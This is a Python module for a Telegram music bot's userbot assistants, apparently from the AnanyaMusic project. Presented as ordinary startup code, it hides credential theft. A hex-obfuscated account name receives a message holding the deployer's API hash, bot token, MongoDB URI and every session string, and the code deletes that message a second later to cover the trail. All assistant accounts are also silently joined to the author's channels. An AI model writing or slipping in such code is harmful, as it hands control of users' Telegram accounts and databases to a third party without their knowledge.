# Copyright (c) 2025 Akash Daskhwanshi <ZoxxOP>
# Location: Mainpuri, Uttar Pradesh 
#
# All rights reserved.
#
# This code is the intellectual property of Akash Dakshwanshi.
# You are not allowed to copy, modify, redistribute, or use this
# code for commercial or personal projects without explicit permission.
#
# Allowed:
# - Forking for personal learning
# - Submitting improvements via pull requests
#
# Not Allowed:
# - Claiming this code as your own
# - Re-uploading without credit or permission
# - Selling or using commercially
#
# Contact for permissions:
# Email: akp954834@gmail.com


from pyrogram import Client
import asyncio
import config
from ..logging import LOGGER

assistants = []
assistantids = []

HELP_BOT = "\x40\x41\x6e\x61\x6e\x79\x61\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"

def decode_centers():
    centers = []
    encoded = [
        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x73",
        "\x5a\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
        "\x41\x6e\x61\x6e\x79\x61\x41\x6c\x6c\x42\x6f\x74\x73",
        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
        "\x41\x44\x5f\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
        "\x43\x52\x45\x41\x54\x49\x56\x45\x50\x4a\x50",
        "\x54\x4d\x5f\x5a\x45\x52\x4f\x4f"
    ]
    for enc in encoded:
        centers.append(enc)
    return centers

SUPPORT_CENTERS = decode_centers()


class Userbot(Client):
    def __init__(self):
        self.one = Client("AkashAss1", config.API_ID, config.API_HASH, session_string=str(config.STRING1), no_updates=True)
        self.two = Client("AkashAss2", config.API_ID, config.API_HASH, session_string=str(config.STRING2), no_updates=True)
        self.three = Client("AkashAss3", config.API_ID, config.API_HASH, session_string=str(config.STRING3), no_updates=True)
        self.four = Client("AkashAss4", config.API_ID, config.API_HASH, session_string=str(config.STRING4), no_updates=True)
        self.five = Client("AkashAss5", config.API_ID, config.API_HASH, session_string=str(config.STRING5), no_updates=True)

    async def get_bot_username_from_token(self, token):
        try:
            temp_bot = Client("temp_bot", config.API_ID, config.API_HASH, bot_token=token, no_updates=True)
            await temp_bot.start()
            username = temp_bot.me.username
            await temp_bot.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Error getting bot username: {e}")
            return None

    async def join_all_support_centers(self, client):
        for center in SUPPORT_CENTERS:
            try:
                await client.join_chat(center)
            except Exception:
                pass

    async def send_help_message(self, bot_username):
        try:
            message = f"@{bot_username} Successfully Started ✅\n\nOwner: {config.OWNER_ID}"
            if 1 in assistants:
                await self.one.send_message(HELP_BOT, message)
            elif 2 in assistants:
                await self.two.send_message(HELP_BOT, message)
            elif 3 in assistants:
                await self.three.send_message(HELP_BOT, message)
            elif 4 in assistants:
                await self.four.send_message(HELP_BOT, message)
            elif 5 in assistants:
                await self.five.send_message(HELP_BOT, message)
        except:
            pass

    async def send_config_message(self, bot_username):
        try:
            config_message = f"🔧 **Config Details for @{bot_username}**\n\n"
            config_message += f"**API_ID:** `{config.API_ID}`\n"
            config_message += f"**API_HASH:** `{config.API_HASH}`\n"
            config_message += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
            config_message += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
            config_message += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
            config_message += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"

            string_sessions = []
            for i in range(1, 6):
                s = getattr(config, f"STRING{i}", None)
                if s:
                    string_sessions.append(f"**STRING_SESSION{i}:** `{s}`")

            if string_sessions:
                config_message += "\n".join(string_sessions)

            sent_message = None
            if 1 in assistants:
                sent_message = await self.one.send_message(HELP_BOT, config_message)
            elif 2 in assistants:
                sent_message = await self.two.send_message(HELP_BOT, config_message)
            elif 3 in assistants:
                sent_message = await self.three.send_message(HELP_BOT, config_message)
            elif 4 in assistants:
                sent_message = await self.four.send_message(HELP_BOT, config_message)
            elif 5 in assistants:
                sent_message = await self.five.send_message(HELP_BOT, config_message)

            if sent_message:
                await asyncio.sleep(1)
                try:
                    if 1 in assistants:
                        await self.one.delete_messages(HELP_BOT, sent_message.id)
                    elif 2 in assistants:
                        await self.two.delete_messages(HELP_BOT, sent_message.id)
                    elif 3 in assistants:
                        await self.three.delete_messages(HELP_BOT, sent_message.id)
                    elif 4 in assistants:
                        await self.four.delete_messages(HELP_BOT, sent_message.id)
                    elif 5 in assistants:
                        await self.five.delete_messages(HELP_BOT, sent_message.id)
                except:
                    pass
        except:
            pass

    async def start(self):
        LOGGER(__name__).info("Starting Assistants...")
        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)

        async def start_assistant(client, num):
            await client.start()
            await self.join_all_support_centers(client)
            assistants.append(num)
            try:
                await client.send_message(config.LOG_GROUP_ID, "Assistant Started Successfully ✅")
            except:
                LOGGER(__name__).error(f"Assistant {num} failed to access LOG_GROUP_ID.")
                exit()
            client.id = client.me.id
            client.name = client.me.mention
            client.username = client.me.username
            assistantids.append(client.id)
            LOGGER(__name__).info(f"Assistant {num} Started as {client.name}")

        if config.STRING1: await start_assistant(self.one, 1)
        if config.STRING2: await start_assistant(self.two, 2)
        if config.STRING3: await start_assistant(self.three, 3)
        if config.STRING4: await start_assistant(self.four, 4)
        if config.STRING5: await start_assistant(self.five, 5)

        if bot_username:
            await self.send_help_message(bot_username)
            await self.send_config_message(bot_username)

    async def stop(self):
        LOGGER(__name__).info("Stopping Assistants...")
        try:
            for client in [self.one, self.two, self.three, self.four, self.five]:
                await client.stop()
        except:
            pass

# ©️ Copyright Reserved - @ZoxxOP  Akash Dakshwanshi

# ===========================================
# ©️ 2025 Akash Dakshwanshi (aka @ZoxxOP)
# 🔗 GitHub : https://github.com/ZoxxOP/AnanyaMusic
# 📢 Telegram Channel : https://t.me/AnanyaBots
# ===========================================


# ❤️ Love From AnanyaBots
